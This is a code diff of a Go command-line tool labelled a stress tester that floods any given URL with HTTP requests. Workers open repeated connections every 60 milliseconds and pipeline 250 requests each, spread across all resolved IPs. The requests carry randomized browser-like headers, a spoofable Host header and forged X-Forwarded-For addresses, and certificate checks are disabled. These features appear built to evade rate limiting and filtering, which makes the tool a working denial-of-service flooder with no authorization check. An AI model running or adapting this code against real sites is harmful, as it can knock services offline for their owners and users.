@@ -2,6 +2,7 @@ package main
 
 import (
     "bytes"
+    "context"
     "crypto/tls"
     "fmt"
     "math/rand"
@@ -14,17 +15,20 @@ import (
     "time"
 )
 
-// Global state for DNS IPs
+// Global variables for DNS handling
 var (
-    ips      []string
-    ipsMutex sync.Mutex
+    ips         []string
+    ipsMutex    sync.Mutex
+    rebalanceCh = make(chan []string)
+)
 
+var (
     httpMethods  = []string{"GET", "GET", "GET", "POST", "HEAD"}
     languages    = []string{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9"}
     contentTypes = []string{"application/x-www-form-urlencoded", "application/json", "text/plain"}
 )
 
-// StressConfig holds command-line configuration
+// StressConfig holds CLI options
 type StressConfig struct {
     Target     *url.URL
     Threads    int
@@ -35,7 +39,6 @@ type StressConfig struct {
 }
 
 func init() {
-    // Seed the random generator for unique requests
     rand.Seed(time.Now().UnixNano())
 }
 
@@ -44,23 +47,29 @@ func main() {
         fmt.Println("Usage: <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST]")
         os.Exit(1)
     }
-
+    // Parse arguments
     rawURL := os.Args[1]
-    threads, _ := strconv.Atoi(os.Args[2])
-    durSec, _ := strconv.Atoi(os.Args[3])
+    threads, err := strconv.Atoi(os.Args[2])
+    if err != nil {
+        fmt.Println("Invalid thread count:", err)
+        os.Exit(1)
+    }
+    durSec, err := strconv.Atoi(os.Args[3])
+    if err != nil {
+        fmt.Println("Invalid duration:", err)
+        os.Exit(1)
+    }
     custom := ""
     if len(os.Args) > 4 {
         custom = os.Args[4]
     }
-
     parsed, err := url.Parse(rawURL)
     if err != nil {
         fmt.Println("Invalid URL:", err)
         os.Exit(1)
     }
-
     port := determinePort(parsed)
-    path := parsed.RequestURI() // includes path + query
+    path := parsed.RequestURI()
 
     cfg := StressConfig{
         Target:     parsed,
@@ -70,8 +79,7 @@ func main() {
         Port:       port,
         Path:       path,
     }
-
-    // Initial DNS
+    // Initial DNS lookup
     addrs, err := lookupIPv4(parsed.Hostname())
     if err != nil {
         fmt.Printf("DNS lookup failed: %v\n", err)
@@ -79,30 +87,147 @@ func main() {
     }
     updateIPs(addrs)
     fmt.Printf("Resolved IPs: %v\n", addrs)
-
-    // Periodic DNS refresh
+    // Start DNS refresher
     go dnsRefresh(parsed.Hostname(), 30*time.Second)
-
-    fmt.Printf("Starting stress test: %s via %s, threads=%d, duration=%v\n",
-        rawURL, path, threads, cfg.Duration)
-    runWorkers(cfg)
+    // Run manager
+    fmt.Printf("Starting stress test: %s, threads=%d, duration=%v\n", rawURL, threads, cfg.Duration)
+    runManager(cfg)
     fmt.Println("Stress test completed.")
 }
 
-// determinePort extracts port from URL or defaults to 80/443
-func determinePort(u *url.URL) int {
-    if p := u.Port(); p != "" {
-        if pi, err := strconv.Atoi(p); err == nil {
-            return pi
-        }
-    }
-    if strings.EqualFold(u.Scheme, "https") {
-        return 443
-    }
-    return 80
+// workerEntry holds the cancel function for a worker
+type workerEntry struct{
+    cancel context.CancelFunc
 }
 
-// lookupIPv4 resolves A records to IPv4 strings
+// runManager starts and dynamically rebalances workers
+func runManager(cfg StressConfig) {
+    workers := make(map[string][]workerEntry)
+    spawnWorker := func(ip string) {
+        ctx, cancel := context.WithCancel(context.Background())
+        workers[ip] = append(workers[ip], workerEntry{cancel: cancel})
+        go workerLoop(ctx, cfg, ip)
+    }
+    // initial spawn
+    rebalance(getSnapshotIPs(), workers, cfg.Threads, spawnWorker)
+    stopTimer := time.After(cfg.Duration)
+    for {
+        select {
+        case <-stopTimer:
+            // cancel all
+            for _, list := range workers {
+                for _, w := range list {
+                    w.cancel()
+                }
+            }
+            return
+        case newIPs := <-rebalanceCh:
+            rebalance(newIPs, workers, cfg.Threads, spawnWorker)
+        }
+    }
+}
+
+// workerLoop is the per-worker goroutine
+func workerLoop(ctx context.Context, cfg StressConfig, ip string) {
+    ticker := time.NewTicker(60 * time.Millisecond)
+    defer ticker.Stop()
+    tlsCfg := &tls.Config{ServerName: cfg.Target.Hostname(), InsecureSkipVerify: true}
+    endTimer := time.After(cfg.Duration)
+    for {
+        select {
+        case <-ctx.Done():
+            return
+        case <-endTimer:
+            return
+        case <-ticker.C:
+            sendBurst(cfg, tlsCfg, ip)
+        }
+    }
+}
+
+// rebalance adjusts workers per IP evenly
+func rebalance(ipsList []string, workers map[string][]workerEntry, total int, spawn func(string)) {
+    n := len(ipsList)
+    if n == 0 {
+        return
+    }
+    base, extra := total/n, total%n
+    desired := make(map[string]int, n)
+    for i, ip := range ipsList {
+        desired[ip] = base
+        if i < extra {
+            desired[ip]++
+        }
+    }
+    // remove defunct IPs
+    for ip, list := range workers {
+        if _, ok := desired[ip]; !ok {
+            for _, w := range list {
+                w.cancel()
+            }
+            delete(workers, ip)
+        }
+    }
+    // spawn or remove
+    for ip, want := range desired {
+        have := len(workers[ip])
+        if have < want {
+            for i := 0; i < want-have; i++ {
+                spawn(ip)
+            }
+        } else if have > want {
+            for i := 0; i < have-want; i++ {
+                w := workers[ip][0]
+                w.cancel()
+                workers[ip] = workers[ip][1:]
+            }
+        }
+    }
+    fmt.Printf("Rebalanced: desired=%v have=%v\n", desired, mapCounts(workers))
+}
+
+// worker count map
+func mapCounts(workers map[string][]workerEntry) map[string]int {
+    m := make(map[string]int)
+    for ip, list := range workers {
+        m[ip] = len(list)
+    }
+    return m
+}
+
+// getSnapshotIPs returns a thread-safe copy
+func getSnapshotIPs() []string {
+    ipsMutex.Lock()
+    defer ipsMutex.Unlock()
+    out := make([]string, len(ips))
+    copy(out, ips)
+    return out
+}
+
+// dnsRefresh updates DNS and signals rebalance
+func dnsRefresh(host string, interval time.Duration) {
+    ticker := time.NewTicker(interval)
+    defer ticker.Stop()
+    for range ticker.C {
+        addrs, err := lookupIPv4(host)
+        if err != nil {
+            fmt.Printf("DNS refresh error: %v\n", err)
+            continue
+        }
+        updateIPs(addrs)
+        fmt.Printf("Re-resolved IPs: %v\n", addrs)
+        rebalanceCh <- addrs
+    }
+}
+
+// updateIPs safely sets global IPs
+func updateIPs(list []string) {
+    ipsMutex.Lock()
+    ips = list
+    ipsMutex.Unlock()
+}
+
+// lookupIPv4 resolves to IPv4 strings
 func lookupIPv4(host string) ([]string, error) {
     addrs, err := net.LookupIP(host)
     if err != nil {
@@ -120,161 +245,87 @@ func lookupIPv4(host string) ([]string, error) {
     return out, nil
 }
 
-// dnsRefresh periodically re-resolves DNS entries
-func dnsRefresh(host string, interval time.Duration) {
-    ticker := time.NewTicker(interval)
-    defer ticker.Stop()
-    for range ticker.C {
-        if addrs, err := lookupIPv4(host); err == nil {
-            updateIPs(addrs)
-            fmt.Printf("Re-resolved IPs: %v\n", addrs)
-        } else {
-            fmt.Printf("DNS refresh error: %v\n", err)
+// determinePort picks from URL or defaults
+func determinePort(u *url.URL) int {
+    if p := u.Port(); p != "" {
+        if i, err := strconv.Atoi(p); err == nil {
+            return i
         }
     }
-}
-
-// updateIPs safely replaces global IP list
-func updateIPs(newList []string) {
-    ipsMutex.Lock()
-    ips = newList
-    ipsMutex.Unlock()
-}
-
-// pickRandomIP returns one IP from the pool
-func pickRandomIP() string {
-    ipsMutex.Lock()
-    defer ipsMutex.Unlock()
-    return ips[rand.Intn(len(ips))]
-}
-
-// runWorkers spawns threads to send bursts until duration elapses
-func runWorkers(cfg StressConfig) {
-    var wg sync.WaitGroup
-    stopCh := time.After(cfg.Duration)
-
-    for i := 0; i < cfg.Threads; i++ {
-        wg.Add(1)
-        go func(id int) {
-            defer wg.Done()
-            ticker := time.NewTicker(60 * time.Millisecond)
-            defer ticker.Stop()
-
-            tlsCfg := &tls.Config{
-                ServerName:         cfg.Target.Hostname(),
-                InsecureSkipVerify: true,
-            }
-
-            for {
-                select {
-                case <-stopCh:
-                    return
-                case <-ticker.C:
-                    sendBurst(cfg, tlsCfg)
-                }
-            }
-        }(i)
+    if strings.EqualFold(u.Scheme, "https") {
+        return 443
     }
-    wg.Wait()
+    return 80
 }
 
-// sendBurst opens a connection and sends ~500 requests back-to-back
-func sendBurst(cfg StressConfig, tlsCfg *tls.Config) {
-    ipAddr := pickRandomIP()
-    address := fmt.Sprintf("%s:%d", ipAddr, cfg.Port)
-
+// sendBurst opens a connection and sends multiple requests
+func sendBurst(cfg StressConfig, tlsCfg *tls.Config, ip string) {
+    address := fmt.Sprintf("%s:%d", ip, cfg.Port)
     conn, err := dialConn(address, tlsCfg)
     if err != nil {
-        fmt.Printf("[dial error] %v\n", err)
+        fmt.Printf("[dial %s] %v\n", ip, err)
         return
     }
     defer conn.Close()
-
     method := httpMethods[rand.Intn(len(httpMethods))]
-
     for i := 0; i < 250; i++ {
-        header, body := buildRequest(cfg, method)
-
-        // batch header+body into one writev call:
+        hdr, body := buildRequest(cfg, method)
         var bufs net.Buffers
-        bufs = append(bufs, []byte(header))
+        bufs = append(bufs, []byte(hdr))
         if method == "POST" {
             bufs = append(bufs, body)
         }
-
-        // write both buffers in one syscall
         if _, err := bufs.WriteTo(conn); err != nil {
-            fmt.Printf("[batched write] %v\n", err)
+            fmt.Printf("[write %s] %v\n", ip, err)
             return
         }
     }
 }
 
-// dialConn chooses TCP or TLS based on port
+// dialConn for TLS or plain
 func dialConn(addr string, tlsCfg *tls.Config) (net.Conn, error) {
-    if tlsCfg != nil && strings.HasSuffix(addr, ":443") {
+    if strings.HasSuffix(addr, ":443") {
         return tls.Dial("tcp", addr, tlsCfg)
     }
     return net.Dial("tcp", addr)
 }
 
-// buildRequest constructs HTTP request string and body
+// buildRequest crafts HTTP/1.1
 func buildRequest(cfg StressConfig, method string) (string, []byte) {
     var buf bytes.Buffer
     hostHdr := cfg.Target.Hostname()
     if cfg.CustomHost != "" {
         hostHdr = cfg.CustomHost
     }
-
-    // Request line + Host
     fmt.Fprintf(&buf, "%s %s HTTP/1.1\r\nHost: %s:%d\r\n", method, cfg.Path, hostHdr, cfg.Port)
-
-    // Common randomized headers
     writeCommonHeaders(&buf)
-
-    // If POST, add content headers and body
     var body []byte
     if method == "POST" {
-        contentType := contentTypes[rand.Intn(len(contentTypes))]
-        body = createBody(contentType)
-        fmt.Fprintf(&buf, "Content-Type: %s\r\n", contentType)
-        fmt.Fprintf(&buf, "Content-Length: %d\r\n", len(body))
+        ct := contentTypes[rand.Intn(len(contentTypes))]
+        body = createBody(ct)
+        fmt.Fprintf(&buf, "Content-Type: %s\r\nContent-Length: %d\r\n", ct, len(body))
     }
-
-    // Final connection header
-    buf.WriteString("Referer: https://")
-    buf.WriteString(hostHdr)
-    buf.WriteString("/\r\nConnection: keep-alive\r\n\r\n")
-
+    buf.WriteString("Referer: https://" + hostHdr + "/\r\nConnection: keep-alive\r\n\r\n")
     return buf.String(), body
 }
 
-// writeCommonHeaders adds headers with randomness
+// writeCommonHeaders emits headers
 func writeCommonHeaders(buf *bytes.Buffer) {
-    buf.WriteString("User-Agent: ")
-    buf.WriteString(randomUserAgent())
-    buf.WriteString("\r\nAccept-Language: ")
-    buf.WriteString(languages[rand.Intn(len(languages))])
-    
-    // Static headers written in a single call
-    buf.WriteString("\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" +
+    buf.WriteString("User-Agent: " + randomUserAgent() + "\r\n")
+    buf.WriteString("Accept-Language: " + languages[rand.Intn(len(languages))] + "\r\n")
+    buf.WriteString(
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" +
         "Accept-Encoding: gzip, deflate, br, zstd\r\n" +
-        "Sec-Fetch-Site: none\r\n" +
-        "Sec-Fetch-Mode: navigate\r\n" +
-        "Sec-Fetch-User: ?1\r\n" +
-        "Sec-Fetch-Dest: document\r\n" +
-        "Upgrade-Insecure-Requests: 1\r\n" +
-        "Cache-Control: no-cache\r\nX-Forwarded-For: ")
-
-    // Generate the IP in one efficient call
-    fmt.Fprintf(buf, "%d.%d.%d.%d\r\n",
-        rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
+        "Sec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate\r\n" +
+        "Sec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\n" +
+        "Upgrade-Insecure-Requests: 1\r\nCache-Control: no-cache\r\nX-Forwarded-For: ")
+    fmt.Fprintf(buf, "%d.%d.%d.%d\r\n", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
 }
 
-// createBody builds a random POST payload based on content-type
-func createBody(contentType string) []byte {
+// createBody random payload
+func createBody(ct string) []byte {
     var b bytes.Buffer
-    switch contentType {
+    switch ct {
     case "application/x-www-form-urlencoded":
         vals := url.Values{}
         for i := 0; i < 3; i++ {
@@ -284,9 +335,7 @@ func createBody(contentType string) []byte {
     case "application/json":
         b.WriteByte('{')
         for i := 0; i < 3; i++ {
-            if i > 0 {
-                b.WriteByte(',')
-            }
+            if i > 0 { b.WriteByte(',') }
             fmt.Fprintf(&b, `"%s":"%s"`, randomString(5), randomString(8))
         }
         b.WriteByte('}')
@@ -296,9 +345,9 @@ func createBody(contentType string) []byte {
     return b.Bytes()
 }
 
-// randomString generates an alphanumeric string of length n
+// randomString returns alphanumeric string
 func randomString(n int) string {
-    const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    letters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
     b := make([]byte, n)
     for i := range b {
         b[i] = letters[rand.Intn(len(letters))]
@@ -306,14 +355,10 @@ func randomString(n int) string {
     return string(b)
 }
 
-// randomUserAgent builds a semi-random UA string
+// randomUserAgent builds a UA header
 func randomUserAgent() string {
     browsers := []string{"Chrome", "Firefox", "Safari", "Edg"}
-    osList := []string{
-        "Windows NT 10.0; Win64; x64",
-        "Macintosh; Intel Mac OS X 10_15_7",
-        "X11; Linux x86_64",
-    }
+    osList := []string{"Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64"}
     br := browsers[rand.Intn(len(browsers))]
     os := osList[rand.Intn(len(osList))]
     ver := fmt.Sprintf("%d.0.%d", rand.Intn(90)+10, rand.Intn(9999))
